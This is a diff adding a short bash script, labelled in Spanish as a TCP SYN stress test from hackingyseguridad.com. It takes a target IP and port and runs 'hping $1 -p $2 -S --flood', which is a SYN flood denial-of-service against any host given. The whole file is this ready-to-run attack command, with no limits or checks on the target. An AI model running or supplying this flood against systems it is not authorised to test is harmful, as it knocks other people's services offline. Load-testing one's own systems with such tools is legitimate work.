@@ -1,0 +1,9 @@
+#!/bin/bash
+# Simple test de stress TCPSYN con hnping3
+# (C) hackingyseguridad.com 2017
+# Uso: ./synflood IP puerto_TCP
+
+echo Uso: ./synflood IP puertoTCP
+OIFS=$IFS;
+IFS=$'\n';
+hping $1 -p $2 -S --flood
